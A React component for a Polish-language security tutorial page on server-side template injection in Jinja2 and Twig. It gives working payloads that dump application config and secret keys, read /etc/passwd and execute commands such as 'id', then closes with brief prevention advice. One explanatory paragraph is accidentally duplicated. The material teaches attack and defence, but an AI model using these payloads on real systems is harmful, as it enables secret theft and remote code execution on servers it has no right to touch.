import { Link } from 'react-router-dom';
import ExampleFrame from '../../exampleFrame/ExampleFrame';
import ssti_schemat from '../../../assets/ssti_schemat.png';
import ssti_result from '../../../assets/ssti_result.png';
import ssti_jinja2 from '../../../assets/ssti_jinja2.png';
import ssti_jinja2_exploiting  from '../../../assets/ssti_jinja2_exploiting.png';
import ssti_jinja2_exploiting_2  from '../../../assets/ssti_jinja2_exploiting_2.png';
import ssti_jinja2_rce  from '../../../assets/ssti_jinja2_rce.png';
import sstj_twig  from '../../../assets/sstj_twig.png';
import sstj_twig_lfi  from '../../../assets/sstj_twig_lfi.png';
import sstj_twig_rce  from '../../../assets/sstj_twig_rce.png';
import sstimap  from '../../../assets/sstimap.png';

const SSTI = () => {

    return(
        <section>
            <h1>SSTI (Server-side Template Injection)</h1>

            <p>Aby umożliwić pomyślne wykorzystanie luki w zabezpieczeniach SSTI, musimy najpierw określić silnik szablonów używany przez aplikację internetową. Aby to osiągnąć, możemy wykorzystać niewielkie różnice w zachowaniu różnych silników szablonów. Rozważmy na przykład następujący powszechnie używany przegląd zawierający niewielkie różnice w popularnych silnikach szablonów:</p>
            <ExampleFrame screen={ssti_schemat} />
            <p>Przy różnych próbach możemy zauważyć że obliczenie zostało zrealizowane wraz z identyfikacją template</p>
            <ExampleFrame screen={ssti_result} />

            <hr />

            <h2>Wykorzystanie SSTI - Jinja2</h2>
            <p>Jinja to silnik szablonów powszechnie używany w frameworkach internetowych <span className='important'>Python</span>, takich jak <span className='important'>Flask lub Django</span>. Ładunki w innych frameworkach internetowych mogą zatem być nieco inne. W naszym payloadzie możemy dowolnie wykorzystywać dowolne biblioteki, które są już zaimportowane przez aplikację <span className='important'>Python, bezpośrednio lub pośrednio</span>. Dodatkowo możemy zaimportować dodatkowe biblioteki za pomocą instrukcji <span className='important'>import</span>.</p>

            <p>Na przykład możemy uzyskać konfigurację aplikacji internetowej za pomocą następującego ładunku SSTI:</p>
            <div className='waring'>
                <p>{`{{ config.items() }}`}</p>
            </div>
            <ExampleFrame screen={ssti_jinja2} />
            <p>Ponieważ ten ładunek zrzuca całą konfigurację aplikacji internetowej, w tym wszelkie użyte tajne klucze, możemy przygotować dalsze ataki, korzystając z uzyskanych informacji. Możemy również wykonać kod Pythona, aby uzyskać informacje o kodzie źródłowym aplikacji internetowej. Możemy użyć następującego ładunku SSTI, aby zrzucić wszystkie dostępne wbudowane funkcje:</p>
            <div className='waring'>
                <p>{`{{ self.__init__.__globals__.__builtins__ }}`}</p>
            </div>
            <ExampleFrame screen={ssti_jinja2_exploiting} />
            <p>Ponieważ ten ładunek zrzuca całą konfigurację aplikacji internetowej, w tym wszelkie użyte tajne klucze, możemy przygotować dalsze ataki, korzystając z uzyskanych informacji. Możemy również wykonać kod Pythona, aby uzyskać informacje o kodzie źródłowym aplikacji internetowej. Możemy użyć następującego ładunku SSTI, aby zrzucić wszystkie dostępne wbudowane funkcje:</p>

            <div className='waring'>
                <p>{`{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}`}</p>
            </div>  
            <ExampleFrame screen={ssti_jinja2_exploiting_2} />
            <p>Możemy użyć wbudowanej funkcji Pythona open, aby dołączyć plik lokalny. Nie możemy jednak wywołać tej funkcji bezpośrednio; musimy wywołać to ze słownika <span className='important'>__builtins__</span>, który zrzuciliśmy wcześniej. W wyniku tego następujący ładunek zawiera plik <span className='important'>/etc/passwd:</span></p>

            <h3>Remote Code Execution (RCE)</h3>

            <p>Aby uzyskać zdalne wykonanie kodu w Pythonie, możemy skorzystać z funkcji udostępnianych przez bibliotekę <span className='important'>os, takich jak system czy popen</span>. Jeśli jednak aplikacja internetowa nie zaimportowała jeszcze tej biblioteki, musimy ją najpierw zaimportować, wywołując wbudowaną funkcję <span className='important'>import</span>. Powoduje to następujący ładunek SSTI:</p>
            <div className='waring'>
                <p>{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</p>
            </div>
            <ExampleFrame screen={ssti_jinja2_rce} />

            <hr />

            <h2>Wykorzystanie SSTI - Twig</h2>
            <p>Twig to silnik szablonów dla języka programowania <span className='important'>PHP</span>.</p>

            <div className='waring'>
                <p>W Twigu możemy użyć słowa kluczowego <span className='important'>_self</span>, aby uzyskać trochę informacji o bieżącym szablonie:</p>
            </div>
            <ExampleFrame screen={sstj_twig} />

            <h3>Local File Inclusion (LFI)</h3>
            <p>Odczyt plików lokalnych (bez korzystania z tego samego sposobu, w jaki będziemy korzystać z RCE) nie jest możliwy przy użyciu wewnętrznych funkcji udostępnianych bezpośrednio przez Twiga. Jednak framework <span className='important'>PHP Symfony</span> definiuje dodatkowe filtry Twig. Jednym z tych filtrów jest <span className='important'>file_excerpt</span> i można go użyć do odczytu plików lokalnych:</p>

            <div className='waring'>
                <p>{`{{ "/etc/passwd"|file_excerpt(1,-1) }}`}</p>
            </div>

            <ExampleFrame screen={sstj_twig_lfi} />

            <h3>Remote Code Execution (RCE)</h3>
            <p>Aby uzyskać zdalne wykonanie kodu, możemy skorzystać z wbudowanej funkcji PHP, takiej jak <span className='important'>system</span>. Możemy przekazać argument do tej funkcji, korzystając z <span className='important'>funkcji filtrującej Twiga</span>, w wyniku czego otrzymamy dowolny z następujących ładunków SSTI:</p>

            <div className='waring'>
                <p>{`{{ ['id'] | filter('system') }}`}</p>
            </div>
            <ExampleFrame screen={sstj_twig_rce} />

            <hr />

            <Link to='https://github.com/FilipowiczP/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md'>PayloadsAllTheThings - Server Side Template Injection</Link>
            <br />
            <Link to='https://github.com/FilipowiczP/SSTImap'>SSTI - automatyczne narzędzie do wykrywania oraz wykorzystywania payload</Link>
            <ExampleFrame screen={sstimap} />

            <hr />

            <h2 className='defense'>Zapobieganie</h2>
            <p className='defense'>Aby zapobiec lukom w zabezpieczeniach SSTI, musimy upewnić się, że dane wejściowe użytkownika nigdy nie zostaną wprowadzone do wywołania funkcji renderowania silnika szablonów w parametrze szablonu. Można to osiągnąć, ostrożnie przechodząc przez różne ścieżki kodu i upewniając się, że dane wejściowe użytkownika nigdy nie są dodawane do szablonu przed wywołaniem funkcji renderującej.</p>

        </section>
    )
};

export default SSTI;